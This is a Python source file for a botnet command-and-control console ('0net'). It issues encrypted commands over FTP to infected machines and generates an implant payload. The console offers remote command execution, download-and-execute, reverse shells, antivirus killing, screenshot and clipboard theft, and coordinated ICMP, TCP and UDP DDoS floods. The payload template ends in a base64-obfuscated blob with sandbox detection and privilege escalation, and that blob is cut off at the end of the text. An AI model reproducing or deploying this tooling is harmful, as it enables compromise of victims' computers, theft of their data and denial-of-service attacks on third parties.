from ftplib import FTP
import time
import string
import requests
from requests import *
import threading;from threading import Thread
import random
import os
import os.path
import platform
from sys import platform


try:
    import socks
except:
    os.system("pip3 install PySocks")


############################################################################################################################################################################
############################################################################################################################################################################

obfuscate = () # Set Ofuscate Var
encryption_key = "" #Encryption key for encrypting outgoing oommands using Vigenère Cipher 

ftp_server = ''     # Your FTP server
ftp_username = ''         # Your username for FTP server
ftp_password = ''     # Your password for FTP server
ftp_directory = ''          # Your public/web facing directory


full_url = ""
response_file_url = "" # Full URL of the responses.txt file
information_file_url = ""   # Full URL of the data.txt file

command_file_name = ''                 # Local name/location of the pico-wifi command file
responses_file = ""       # Local location of the responses.txt file  
data_file = ""                 # Local location of data.txt file
screenshot_file = ""     # Local location for future 'screenshot.png' files

############################################################################################################################################################################
############################################################################################################################################################################


print("[%]Starting")



def helpm():
    
    print("\n[viewing/control]")
    print("[view] - View ALL currently connected bots")
    print("[refresh] - Refresh list of C&C server files & currently connected bots")
    print("[target] - Execute more targeted commands on a specific connected bot (targeted via its current public IP address)\n")

    
    print("[anonymization/anti-analysis]")
    print("[obfuscate] - ALL bots will halt outgoing connections to C&C server; ALL bots main payload file's properties, signature and extention type's change for a set amount of time to avoid anti-malware detection (bots cannot be used during this time)")
    print("[proxy] - Send ALL bots traffic through a HTTP-proxy to avoid exposing critical information in external connections via traffic analysis")
    print("[disable] - Kill all running processes of common antivirus(win) and anti-rootkit/file detection software(lin) on ALL bots systems to avoid the payload being periodically detected\n")
    

    print("[system/command-injection]")
    print("[echo] - Display text output on ALL bots payload terminal - TESTING PURPOSES!")
    print("[message] - Display a GUI message on ALL bots systems (Requires GUI - Check 'extract' command)")
    print("[cmd] - Execute system command on All bots systems")
    print("[download] - Download and execute a file from a URL on ALL bots systems")
    print("[redirect] - Redirect ALL bots to url via webbrowser\n")
    
    print("[DDOS/abuse]")
    print("[icmp-ddos] - Launch a collective ICMP based DDOS attack from ALL bots simultaneously to a target host/ip for a set amount of time")
    print("[tcp-ddos] - Launch a collective TCP based DDOS attack from ALL bots simultaneously to a target ip address for a set amount of time")
    print("[udp-ddos] - Launch a collective UDP based DDOS attack from ALL bots simultaneously to a target ip address and port number for a set amount of time\n")


def targhelpm():

    print("\n[system/command-injection]")
    print("[echo] - Display text output on a targeted systems payload terminal - TESTING PURPOSES!")
    print("[message] - Display a GUI message on a targeted bots system (Requires GUI - Check 'extract' command)")
    print("[cmd] - Execute system command on targeted system")
    print("[download] - Download and execute a file from a URL on bots system\n")

    print("[exfiltration/reconnaissance]")
    print("[extract] - Learn more about a bot by extracting information about the targets system and network (save the results locally in a text file on this system)")
    print("[screenshot] - Force bot to remotely take a full-image screenshot of the bots main display and temporarily upload to the server for automatic download (Requires GUI - Check 'extract' command)")
    print("[clipboard] - Extract most recent clipboard contents from bot and upload to server locally for download (Requires GUI - Check 'extract' command)\n")

    print("[remote-access/control]")
    print("[shell-external-tcp] - Force the bot to establish an external reverse TCP shell connection to a system; bot connects to a provided listening IP address and port number")
    print("[shell-external-http] - Force the bot to establish an external reverse HTTP shell connection to a system; bot connects to a provided listening hostname/address and port number\n")

    print("[misc]")
    print("[back] - Exit from targeted shell/choose new target\n")

          

try:
    ip = requests.get("https://api.ipify.org").content
except:
    print("[!]Error - WAN connection failed")
    exit()



print("""
[0] View Configuration Information
[1] Start Connection To C&C Server
[2] Configure Proxy/TOR Connection
[3] Generate Payload File
""")

while True:

    
    menu = input("<0net:> ")


    if menu =="0":

        print("\n[+]OUT-FACING")
        print("[%]C&C Domain:",full_url)
        print("[%]C&C Directory:",ftp_directory)
        print("[%]C&C Response File:",response_file_url)
        print("[%]C&C Information File:",information_file_url)
        print("[+]INTERNAL")
        print("[%]Connecting IP:",ip)
        print("[%]FTP Directory:",ftp_directory)
        print("[%]Response File:",responses_file)
        print("[%]Data File:",data_file)
        print("[%]Screenshot File:",screenshot_file)
        print("\n")
    
    if menu =="1":
        
        print("\n[%]Starting FTP connection")
        try:
            time.sleep(2)

            #files to be deleted
            
            files_to_delete = ['lock.txt', 'ips.txt', 'responses.txt']

            #connect to the FTP server
            
            ftp = FTP(ftp_server)
            ftp.login(user=ftp_username, passwd=ftp_password)
            ftp.cwd(ftp_directory)
            ftp.timeout = 999999
            ftp.set_pasv(True)

            def nop():
                while True:
                    time.sleep(10)         #persist connection to FTP server (avoid timeout errors)
                    ftp.voidcmd("NOOP")


            nops = threading.Thread(target=nop)
            nops.start()

            print("[+]FTP connection established")
        except Exception as E:
            print("[!]Error in FTP connection:",E)
            time.sleep(1)
            

        print("[%]Cleaning up files")

        def cls():

            for file_to_delete in files_to_delete:
                try:
                    ftp.delete(file_to_delete)
                except Exception as e:
                    print()
                    pass

            time.sleep(2)
            
        cls()
              
        print("[%]Starting server connection")

        try:
            
            time.sleep(2)
            files = ftp.nlst()
            file_to_edit = command_file_name
            
        except Exception as E:
            
            print("[!]Error in server connection:",E)
            break

        print("[+]Connection established\n")
        print("[%]use 'help' command for controls list\n")

        back = False

        while True:

            try:
                
                while True:

                    back = False
                    
                    choose = input("<0net/command:> ")

                    targ_commands = ["target","view","echo","message","cmd","redirect","obfuscate","help","","back","icmp-ddos","tcp-ddos","udp-ddos","refresh","proxy","disable","download"] #add new commands here

                    if choose in targ_commands:
                        mainfc = True

                    if choose not in targ_commands:
                        break

                    if choose =="":
                        _ = ""
                        break
                    

                    if choose =="help":
                        helpm()
                        break

                    if choose == "view":

                        print("\n[%]Current connected bots: \n")

                        file = responses_file
                        ftp.retrlines("RETR " + file, lambda line: print(line))
                        print("\n")
                        break

                    if choose == "back":
                        back = True
                        
                    if choose == "target":
                        
                        if back == True:
                            break
                        else:
                            back = False
                        while True:
                        
                            cmd = input("<0net/command/target/[enter IP address of target machine]:> ")

                            targ_commands = ["back","help","echo","message","cmd","extract","download","screenshot","clipboard","shell-external-tcp","shell-external-http"] #add new targeted commands here 

                            if cmd =="":
                                pass
                            
                            if cmd =="back":
                                mainfc = False
                                break

                            print("\n[%]use 'help' command for targeted controls list\n")


                            back = False
                            
                            while True:
                                
                                if back == True:
                                    break
                                
                                while True:

                                    back = False
                                    
                                    cmdip = input("<0net/command/target/"+cmd+":> ")

                                    if cmdip not in targ_commands:
                                        break
                                    
                                    if cmdip =="":
                                        break

                                    if cmdip =="back":
                                        mainfc = False

                                        back = True

                                    if cmdip =="help":
                                        targhelpm()
                                        break

                                    if cmdip =="clipboard":

                                        ras = ''.join(random.choice(string.ascii_letters) for _ in range(4))
                                        command = "ip("+cmd+")CLIPBOARD"

                                        print("[%]Obtaining clipboard information from "+cmd+"...")

                                        file = data_file
                                        local_file_path = "bot_information/"+"clipboard-"+cmd+"-"+ras+".txt"
                                    
                                        def prints():
                                            time.sleep(5)
                                            with open(local_file_path, "wb") as local_file:
                                                ftp.retrbinary("RETR " + file, local_file.write)

                                                print("\n[+]"+local_file_path,"saved\n")

                                        st = threading.Thread(target=prints)
                                        st.start()

                                      
                                    if cmdip =="download":

                                        url = input("<0net/command/target/"+cmd+"/[enter url of file (ex: https://example.com/file.exe)]:> ")

                                        command = "ip("+cmd+")"+"["+url+"]DOWNLOAD"


                                    if cmdip =="shell-external-tcp":


                                        host = input("<0net/command/target/"+cmd+"/[enter IP address of the listener]:> ")
                                        port = input("<0net/command/target/"+cmd+"/[enter port number of the listener]:> ")

                                        cmdip = host+":"+port

                                        command = "ip("+cmd+")"+"["+cmdip+"]SHELL-EXT-TCP"

                                        
                                    if cmdip =="shell-external-http":


                                        host = input("<0net/command/target/"+cmd+"/[enter url/host of the listener]:> ")
                                        port = input("<0net/command/target/"+cmd+"/[enter port number of the listener]:> ")

                                        cmdip = host+":"+port

                                        command = "ip("+cmd+")"+"["+cmdip+"]SHELL-EXT-HTTP"

                                    if cmdip =="echo":

                                        ex = input("<0net/command/target/"+cmd+"/echo/[enter message to send]:> ")
                                        cmdip = ex
                                        
                                        command = "ip("+cmd+")"+"["+cmdip+"]ECHO"

                                    if cmdip =="message":

                                        ex = input("<0net/command/target/"+cmd+"/echo/[enter message title]:> ")
                                        extwo = input("<0net/command/target/"+cmd+"/echo/[enter message body]:> ")
                                        
                                        cmdip = ex+":"+extwo
                                        
                                        command = "ip("+cmd+")"+"["+cmdip+"]MESSAGE"

                                    if cmdip =="cmd":

                                        ex = input("<0net/command/target/"+cmd+"/cmd/[enter system command to execute]:> ")
                                        cmdip = ex
                                        
                                        command = "ip("+cmd+")"+"["+cmdip+"]CMD"

                                    if cmdip =="extract":

                                        ras = ''.join(random.choice(string.ascii_letters) for _ in range(4))

                                        command = "ip("+cmd+")EXTRACT"

                                        print("[%]Obtaining information from "+cmd+"...")

                                        file = data_file
                                        local_file_path = "bot_information/"+cmd+"-"+ras+".txt"
                                    
                                        def prints():
                                            time.sleep(10)
                                            with open(local_file_path, "wb") as local_file:
                                                ftp.retrbinary("RETR " + file, local_file.write)

                                                print("\n[+]"+local_file_path,"saved\n")

                                        st = threading.Thread(target=prints)
                                        st.start()

                                    if cmdip =="screenshot":

                                        command = "ip("+cmd+")SCREENSHOT"

                                        ras = ''.join(random.choice(string.ascii_letters) for _ in range(4))             #ADD THREAD SCREENSHOT DOWNLOAD

                                        file = screenshot_file                                        
                                        local_file_path = "bot_information/"+cmd+"-"+ras+"-screenshot"+".png"

                                        def prints():
                                            
                                            try:
                                                time.sleep(6)
                                                with open(local_file_path, "wb") as local_file:
                                                    ftp.retrbinary("RETR " + file, local_file.write)

                                                    print("\n[+]"+local_file_path,"saved\n")
                                            except:
                                                print("[!]Screenshot failed - try again")

                                        st = threading.Thread(target=prints)
                                        st.start()

                                    if back == True:
                                        break
                                        
                                    command = str(command)
                                    cm = command

                                    print("[%]Encrypting command")

                                    text_to_encrypt = cm
                                    
                                    encrypted_text = ""
                                    key_length = len(encryption_key)

                                    for i in range(len(text_to_encrypt)):
                                        char = text_to_encrypt[i]
                                        key_char = encryption_key[i % key_length]

                                        if char.isalpha():
                                            is_upper = char.isupper()
                                            char_shift = ord(char) - ord('A') if is_upper else ord(char) - ord('a')
                                            key_shift = ord(key_char) - ord('A') if key_char.isupper() else ord(key_char) - ord('a')

                                            encrypted_char = chr(((char_shift + key_shift) % 26) + ord('A') if is_upper else ((char_shift + key_shift) % 26) + ord('a'))
                                            encrypted_text += encrypted_char
                                        elif char.isdigit():
                                            char_shift = int(char)
                                            key_shift = int(key_char, 36)
                                            
                                            encrypted_digit = str((char_shift + key_shift) % 10)
                                            encrypted_text += encrypted_digit
                                        else:
                                            encrypted_text += char

                                    cm = encrypted_text


                                    with open(file_to_edit, 'wb') as local_file:
                                        updated_content = cm.encode('utf-8')  #encode the string as bytes
                                        local_file.write(updated_content)

                                    with open(file_to_edit, 'rb') as local_file:
                                        ftp.storbinary(f"STOR {file_to_edit}", local_file)

                                    print("[+]Command sent to",cmd)
                                    time.sleep(2)
                                    command = ""
                                    cm = str(command)

                                    with open(file_to_edit, 'wb') as local_file:
                                        updated_content = cm.encode('utf-8')  #encode the string as bytes
                                        local_file.write(updated_content)

                                    with open(file_to_edit, 'rb') as local_file:
                                        ftp.storbinary(f"STOR {file_to_edit}", local_file)

                    if choose == "refresh":
                        cls()
                        break

                    if choose == "download":

                        url = input("<0net/command/[enter url of file (ex: https://example.com/file.exe)]:> ")
                        command = "download("+url+")ALL"

                        
                    if choose == "proxy":

                        ip = input("<0net/command/proxy/[enter IP of http-proxy]:> ")
                        port = input("<0net/command/proxy/[enter port of http-proxy]:> ")

                        command = "proxy("+ip+")"+"["+port+"]ALL"

                    if choose == "disable":

                        command = "disable()ALL"

                    if choose == "echo":
                        
                        cmd = input("<0net/command/echo/[enter message to send]:> ")
                        command = "echo("+cmd+")ALL"

                    if choose == "message":

                        cmd = input("<0net/command/echo/[enter message title]:> ")
                        cmdtwo = input("<0net/command/echo/[enter message body]:>")

                        command = "message("+cmd+")"+"["+cmdtwo+"]ALL"

                    
                    if choose == "cmd":
                        
                        cmd = input("<0net/command/cmd/[enter system command to execute]:> ")
                        command = "cmd("+cmd+")ALL"

                    if choose == "redirect":

                        cmd = input("<0net/command/redirect/[enter url to redirect]:> ")
                        command = "redirect("+cmd+")ALL"

                    if choose =="obfuscate":
                        
                        cmd = input("<0net/command/obfuscate/[enter amount of time to obfuscate]:> ")
                        command = "obfuscate("+cmd+")ALL"

                        timestop = int(cmd)
                        
                        obfuscate = True

                    if choose =="icmp-ddos":

                        hst = input("<0net/command/icmp-ddos/[enter target domain/ip address]:> ")
                        dur = input("<0net/command/icmp-ddos/[enter attack duration]:> ")
                        cmdip = hst+":"+dur

                        command = "icmp-ddos("+hst+")"+"["+dur+"]ALL"

                    if choose =="tcp-ddos":

                        hst = input("<0net/command/tcp-ddos/[enter target ip]:> ")
                        dur = input("<0net/command/tcp-ddos/[enter attack duration]:> ")
                        cmdip = hst+":"+dur

                        command = "tcp-ddos("+hst+")"+"["+dur+"]ALL"

                    if choose =="udp-ddos":

                        hst = input("<0net/command/udp-ddos/[enter target ip]:> ")
                        prt = input("<0net/command/udp-ddos/[enter target port number]:>")
                        dur = input("<0net/command/udp-ddos/[enter attack duration]:> ")

                        command = "udp-ddos("+hst+")"+"["+dur+"]"+"{"+prt+"}"+"ALL"
                                    


                    if choose =="":
                        _ = ""
                        break

                    if mainfc == True:
                        
                        command = str(command)
                        cm = command

                        print("[%]Encrypting command")

                        text_to_encrypt = cm
                        
                        encrypted_text = ""
                        key_length = len(encryption_key)

                        for i in range(len(text_to_encrypt)):
                            char = text_to_encrypt[i]
                            key_char = encryption_key[i % key_length]

                            if char.isalpha():
                                is_upper = char.isupper()
                                char_shift = ord(char) - ord('A') if is_upper else ord(char) - ord('a')
                                key_shift = ord(key_char) - ord('A') if key_char.isupper() else ord(key_char) - ord('a')

                                encrypted_char = chr(((char_shift + key_shift) % 26) + ord('A') if is_upper else ((char_shift + key_shift) % 26) + ord('a'))
                                encrypted_text += encrypted_char
                            elif char.isdigit():
                                char_shift = int(char)
                                key_shift = int(key_char, 36)
                                
                                encrypted_digit = str((char_shift + key_shift) % 10)
                                encrypted_text += encrypted_digit
                            else:
                                encrypted_text += char


                        cm = encrypted_text


                        with open(file_to_edit, 'wb') as local_file:
                            updated_content = cm.encode('utf-8')  #encode the string as bytes
                            local_file.write(updated_content)

                        with open(file_to_edit, 'rb') as local_file:
                            ftp.storbinary(f"STOR {file_to_edit}", local_file)

                        print("[+]Command sent to ALL bots")
                        time.sleep(2)
                        command = ""
                        cm = str(command)

                        with open(file_to_edit, 'wb') as local_file:
                            updated_content = cm.encode('utf-8')  #encode the string as bytes
                            local_file.write(updated_content)

                        with open(file_to_edit, 'rb') as local_file:
                            ftp.storbinary(f"STOR {file_to_edit}", local_file)

                        if obfuscate == True:
                            time.sleep(1)
                            print("[%]Bots are currently in obfuscation mode to avoid detection...")
                            time.sleep(timestop)
                            obfuscate = False
                        else:
                            pass
                    else:
                        pass

            except Exception as E:
                if "500" or "550" in str(E):
                    print("[%] No bots currently connected\n",)
                else:
                    print("\n[!] Error:",E)
                pass

    if menu =="2":

        back = False

        if back == True:
            break
        else:
            back = False

        print("\n[1] Use TOR")
        print("[2] Use proxy\n")

        while back == False:

            chsanon = input("<0net/security:> ")
            if chsanon =="back":
                back = True

            if chsanon =="1":

                tor_ip = "127.0.0.1" #configure TOR IP
                tor_port = "9150" #configure TOR Port

                try:
                    tor_proxy = {
                        'http': 'socks5://'+tor_ip+':'+tor_port,
                        'https': 'socks5://'+tor_ip+':'+tor_port,
                    }

                    print("\n[%] Connecting to TOR network on:",tor_ip+":"+tor_port)
                    os.environ['HTTP_PROXY'] = tor_proxy['http']
                    os.environ['HTTPS_PROXY'] = tor_proxy['https']
                    
                    url = 'https://api.ipify.org'
                    response = requests.get(url)

                    print("[+] Connected via TOR, IP:",response.text,"\n")
                    back = True
    
                except:
                    print("\n[!] Unable to establish TOR connection, please check configuration/network\n")

            if chsanon =="2":


                print("\n[1] HTTP")
                print("[2] HTTPS")
                print("[3] SOCKS4")
                print("[4] SOCKS5\n")

                proxytype = input("<0net/security/proxy/[enter proxy type]:> ")

                if proxytype == "1":
                    prx = "HTTP_PROXY"
                    prxc = str("http")
                elif proxytype == "2":
                    prx = "HTTPS_PROXY"
                    prxc = str("https")
                elif proxytype == "3":
                    prx = "SOCKS4_PROXY"
                    prxc = str("socks4")
                elif proxytype == "4":
                    prx = "SOCKS5_PROXY"
                    prxc = str("socks5")

                ip = input("<0net/security/proxy/[enter proxy IP]:> ")
                port = input("<0net/security/proxy/[enter proxy port]:> ")

                proxy = prxc+"://"+ip+":"+port

                os.environ['http_proxy'] = proxy
                os.environ['HTTP_PROXY'] = proxy
                os.environ['https_proxy'] = proxy
                os.environ['HTTPS_PROXY'] = proxy
                
                try:
                    r = requests.get("https://api.ipify.org").text
                    print("\n[+] Connected via proxy, IP:",r,"\n")
                    
                except Exception as E:
                    print("\n[!] Unable to establish connection, please check configuration/network\n")



    if menu =="3":

        try:
            import PyInstaller
        except:
            os.system("py -m pip install PyInstaller")
            os.system("pip install PyInstaller")

        print("\n[%]Generating Payload File")

        stng = ''.join(random.choices(string.ascii_letters + string.digits, k=3))

        payload_name = "payload-"+stng+".pyw"

        content = f'''

import time
import base64
import platform
import os
import sys
import time
import socket
import requests
from requests import get
import threading
from threading import Thread
import re
import webbrowser
import inspect
from shutil import copy
from pathlib import Path
import random
import uuid
import string
import urllib.request
from urllib import request, parse
import subprocess
import json
import ctypes
from io import BytesIO
import shutil
from datetime import datetime
import hashlib
import io
import urllib.parse
import urllib.request
import multiprocessing
import random

try:
    import winreg
except:
    pass

global gui
gui = ()

try:
    import tkinter as tk
    import pyautogui
    import pyscreenshot as ImageGrab
    import tkinter.messagebox
    gui = True
    
except:
    gui = False
    pass


code = "CmltcG9ydCBwbGF0Zm9ybQppbXBvcnQgb3MKaW1wb3J0IHN5cwppbXBvcnQgdGltZQppbXBvcnQgc29ja2V0CmltcG9ydCByZXF1ZXN0cwpmcm9tIHJlcXVlc3RzIGltcG9ydCBnZXQKaW1wb3J0IHRocmVhZGluZwpmcm9tIHRocmVhZGluZyBpbXBvcnQgVGhyZWFkCmltcG9ydCByZQppbXBvcnQgd2ViYnJvd3NlcgppbXBvcnQgaW5zcGVjdApmcm9tIHNodXRpbCBpbXBvcnQgY29weQpmcm9tIHBhdGhsaWIgaW1wb3J0IFBhdGgKaW1wb3J0IHJhbmRvbQppbXBvcnQgdXVpZAppbXBvcnQgc3RyaW5nCmltcG9ydCB1cmxsaWIucmVxdWVzdApmcm9tIHVybGxpYiBpbXBvcnQgcmVxdWVzdCwgcGFyc2UKaW1wb3J0IHN1YnByb2Nlc3MKaW1wb3J0IGpzb24KaW1wb3J0IGN0eXBlcwpmcm9tIGlvIGltcG9ydCBCeXRlc0lPCmltcG9ydCBzaHV0aWwKZnJvbSBkYXRldGltZSBpbXBvcnQgZGF0ZXRpbWUKaW1wb3J0IGhhc2hsaWIKaW1wb3J0IGlvCmltcG9ydCB1cmxsaWIucGFyc2UKaW1wb3J0IHVybGxpYi5yZXF1ZXN0CmltcG9ydCBtdWx0aXByb2Nlc3NpbmcKaW1wb3J0IHJhbmRvbQoKdHJ5OgogICAgaW1wb3J0IHdpbnJlZwpleGNlcHQ6CiAgICBwYXNzCgpnbG9iYWwgZ3VpCmd1aSA9ICgpCgp0cnk6CiAgICBpbXBvcnQgdGtpbnRlciBhcyB0awogICAgaW1wb3J0IHB5YXV0b2d1aQogICAgaW1wb3J0IHB5c2NyZWVuc2hvdCBhcyBJbWFnZUdyYWIKICAgIGltcG9ydCB0a2ludGVyLm1lc3NhZ2Vib3gKICAgIGd1aSA9IFRydWUKICAgIApleGNlcHQ6CiAgICBndWkgPSBGYWxzZQogICAgcGFzcwoKI3B5c2NyZWVuc2hvdAojcmVxdWVzdHMKI3B5YXV0b2d1aQojcGlsbG93CgojTXVsdGlwbGUgYm90cyBvbiB0aGUgc2FtZSBuZXR3b3JrIG9yIHVuZGVyIHRoZSBzYW1lIGlwIHVzZSBhIHJvdW5kLXJvYmluIGJhc2VkIGFsZ29yaXRobSB0ZWNobmlxdWUgdG8ga2VlcCB0aGUgYyZjIHNlcnZlciBjb25uZWN0ZWQgdG8gdGhlIGRlc2lyZWQgbmV0d29yaywgdXNlZCB0byBhdm9pZCBoZWF2eSB0cmFmZmljIGxvYWRzIGFuZCBib3VuY2UgYXJvdW5kIHRoZSBuZXR3b3JrCgpkZWYgdm1fZGV0ZWN0aW9uKCk6CgogICAgc3lzdGVtID0gcGxhdGZvcm0uc3lzdGVtKCkKCiAgICBpZiBzeXN0ZW0gPT0gIldpbmRvd3MiOgoKICAgICAgICB0cnk6IAogICAgICAgICAgICBkZWYgaXNfd2luZG93c192bSgpOgoKICAgICAgICAgICAgICAgIGlmIG9zLnBhdGguZXhpc3RzKCdDOlxcV2luZG93c1xcU3lzdGVtMzJcXHZtZ3Vlc3QuZGxsJyk6CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIFRydWUKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgY29tbW9uX3ZtX3Byb2Nlc3NlcyA9IFsndm13YXJlJywgJ3Zib3gnLCAncWVtdScsICd2aXJ0dWFsYm94JywgJ3ZhZ3JhbnQnLCAndm10b29sc2QnXQogICAgICAgICAgICAgICAgZm9yIHByb2Nlc3MgaW4gY29tbW9uX3ZtX3Byb2Nlc3NlczoKICAgICAgICAgICAgICAgICAgICBpZiBhbnkocHJvY2Vzcy5sb3dlcigpIGluIHAubG93ZXIoKSBmb3IgcCBpbiBvcy5wb3BlbigndGFza2xpc3QnKS5yZWFkbGluZXMoKSk6CiAgICAgICAgICAgICAgICAgICAgICAgIHJldHVybiBUcnVlCiAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICB2aXJ0dWFsX3JlZ19rZXlzID0gWwogICAgICAgICAgICAgICAgICAgIHInSEtFWV9MT0NBTF9NQUNISU5FXEhBUkRXQVJFXEFDUElcRFNEVFxWQk9YX18nLAogICAgICAgICAgICAgICAgICAgIHInSEtFWV9MT0NBTF9NQUNISU5FXEhBUkRXQVJFXERlc2NyaXB0aW9uXFN5c3RlbVxCSU9TXFZpcnR1YWxCb3gnLAogICAgICAgICAgICAgICAgICAgIHInSEtFWV9MT0NBTF9NQUNISU5FXFNZU1RFTVxDdXJyZW50Q29udHJvbFNldFxTZXJ2aWNlc1xWQm94RHJ2JwogICAgICAgICAgICAgICAgXQogICAgICAgICAgICAgICAgZm9yIHJlZ19rZXkgaW4gdmlydHVhbF9yZWdfa2V5czoKICAgICAgICAgICAgICAgICAgICBpZiBvcy5zeXN0ZW0oZidyZWcgcXVlcnkgIntyZWdfa2V5fSInKSA9PSAwOgogICAgICAgICAgICAgICAgICAgICAgICByZXR1cm4gVHJ1ZQogICAgICAgICAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAgICAgICAgIAogICAgICAgICAgICBpZiBpc193aW5kb3dzX3ZtKCk6CiAgICAgICAgICAgICAgICBwcmludCgiVGhlIHByb2dyYW0gaXMgcnVubmluZyBvbiBvciBhbG9uZyBzaWRlIGEgdmlydHVhbCBtYWNoaW5lLiIpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEwKQogICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludCgiTm8gdmlydHVhbGlzYXRpb24gZGV0ZWN0ZWQiKQoKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKICAgICAgICAKICAgIGlmIHN5c3RlbSA9PSAiTGludXgiOgoKICAgICAgICB0cnk6CiAgICAgICAgICAgIHJlc3VsdCA9IFtdCiAgICAgICAgICAgIG51bV92bV9kZXRlY3Rpb25zID0gMCAgCgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB0ZXN0ID0gMAogICAgICAgICAgICAgICAgbGlzdF9kaXIgPSBvcy5saXN0ZGlyKCcvdXNyL2Jpbi8nKQogICAgICAgICAgICAgICAgbGlzdHMgPSB7InZtd2FyZS0iLCAidmJveCJ9CiAgICAgICAgICAgICAgICBmb3IgaSBpbiBsaXN0czoKICAgICAgICAgICAgICAgICAgICBpZiBhbnkoaSBpbiBzIGZvciBzIGluIGxpc3RfZGlyKToKICAgICAgICAgICAgICAgICAgICAgICAgdGVzdCArPSAxCiAgICAgICAgICAgICAgICBpZiB0ZXN0ICE9IDA6CiAgICAgICAgICAgICAgICAgICAgbnVtX3ZtX2RldGVjdGlvbnMgKz0gMQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwYXNzCgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICBpZiAnaHlwZXJ2aXNvcicgaW4gb3BlbigiL3Byb2MvY3B1aW5mbyIpLnJlYWQoKToKICAgICAgICAgICAgICAgICAgICByZXN1bHQuYXBwZW5kKE5vbmUpICAKICAgICAgICAgICAgICAgICAgICBudW1fdm1fZGV0ZWN0aW9ucyArPSAxCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHBhc3MKCiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIHRlc3QgPSAwCiAgICAgICAgICAgICAgICB3aXRoIG9wZW4oIi9wcm9jL3Njc2kvc2NzaSIpIGFzIGY6CiAgICAgICAgICAgICAgICAgICAgbGlzdF9kaXIgPSBmLnJlYWQoKS5zcGxpdCgiICIpCiAgICAgICAgICAgICAgICBsaXN0cyA9IHsiVk13YXJlIiwgIlZCT1gifQogICAgICAgICAgICAgICAgZm9yIGkgaW4gbGlzdHM6CiAgICAgICAgICAgICAgICAgICAgaWYgYW55KGkgaW4gcyBmb3IgcyBpbiBsaXN0X2Rpcik6CiAgICAgICAgICAgICAgICAgICAgICAgIHRlc3QgKz0gMQogICAgICAgICAgICAgICAgaWYgdGVzdCAhPSAwOgogICAgICAgICAgICAgICAgICAgIG51bV92bV9kZXRlY3Rpb25zICs9IDEKICAgICAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICAgICAgcGFzcwoKICAgICAgICAgICAgdHJ5OgogICAgICAgICAgICAgICAgbmFtZSA9IG9wZW4oIi9zeXMvY2xhc3MvZG1pL2lkL2Jpb3NfdmVuZG9yIikucmVhZCgpCiAgICAgICAgICAgICAgICB0ZXN0ID0gMAogICAgICAgICAgICAgICAgbGlzdHMgPSB7InZtd2FyZSIsICJ2Ym94IiwgIlBob2VuaXgiLCAiaW5ub3RlayJ9CiAgICAgICAgICAgICAgICBmb3IgaSBpbiBsaXN0czoKICAgICAgICAgICAgICAgICAgICBpZiBhbnkoaSBpbiBzIGZvciBzIGluIG5hbWUpOgogICAgICAgICAgICAgICAgICAgICAgICByZXN1bHQuYXBwZW5kKE5vbmUpICAKICAgICAgICAgICAgICAgICAgICAgICAgdGVzdCArPSAxCiAgICAgICAgICAgICAgICBpZiB0ZXN0ICE9IDA6CiAgICAgICAgICAgICAgICAgICAgbnVtX3ZtX2RldGVjdGlvbnMgKz0gMQogICAgICAgICAgICBleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICAgICAgICAgICAgICBwYXNzCgoKICAgICAgICAgICAgdm1fZGV0ZWN0ZWQgPSBudW1fdm1fZGV0ZWN0aW9ucyA+PSAzCgogICAgICAgICAgICBpZiB2bV9kZXRlY3RlZDoKICAgICAgICAgICAgICAgIHByaW50KCdcblRoZSBwcm9ncmFtIGlzIHJ1bm5pbmcgb24gb3IgYWxvbmdzaWRlIGEgdmlydHVhbCBtYWNoaW5lLicpCiAgICAgICAgICAgICAgICB0aW1lLnNsZWVwKDEwKQogICAgICAgICAgICAgICAgZXhpdCgpCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICBwcmludCgiTm8gdmlydHVhbGlzYXRpb24gZGV0ZWN0ZWQiKQogICAgICAgICAgICAgICAgCiAgICAgICAgZXhjZXB0IEV4Y2VwdGlvbiBhcyBlOgogICAgICAgICAgICBwYXNzCgp2bV9kZXRlY3Rpb24oKQoKdW5hbWUgPSBwbGF0Zm9ybS51bmFtZSgpCm9wZXJhdGluZ19zeXN0ZW0gPSB1bmFtZS5zeXN0ZW0KCmlmIG9wZXJhdGluZ19zeXN0ZW0gPT0gJ1dpbmRvd3MnOgoKICAgIHNlcCA9IG9zLnBhdGguc2VwCiAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuYXJndlswXSkKCiAgICBpZiBnZXRhdHRyKHN5cywgJ2Zyb3plbicsIEZhbHNlKToKICAgICAgICBzY3JpcHRfcGF0aCA9IG9zLnBhdGguYWJzcGF0aChzeXMuZXhlY3V0YWJsZSkKCiAgICBzY3JpcHRfZGlyZWN0b3J5ID0gb3MucGF0aC5kaXJuYW1lKHNjcmlwdF9wYXRoKQogICAgc2NyaXB0X2ZpbGVuYW1lID0gb3MucGF0aC5iYXNlbmFtZShzY3JpcHRfcGF0aCkKICAgIHNjcmlwdF9kaXJlY3RvcnlfZmlsZW5hbWUgPSBzY3JpcHRfZGlyZWN0b3J5ICsgc2VwICsgc2NyaXB0X2ZpbGVuYW1lCgoKICAgIGRlZiByZWdfa2V5KCk6CgogICAgICAgIGlmIGN0eXBlcy53aW5kbGwuc2hlbGwzMi5Jc1VzZXJBbkFkbWluKCkgIT0gMToKICAgICAgICAgICAgcHJpbnQoIm5vdCBhZG1pbiIpCiAgICAgICAgICAgIHRpbWUuc2xlZXAoMikKICAgICAgICAgICAgcHJpbnQoImF0dGVtcHRpbmcgdG8gb2J0YWluIGFkbWluIikKCiAgICAgICAgICAgIHJlcyA9IGN0eXBlc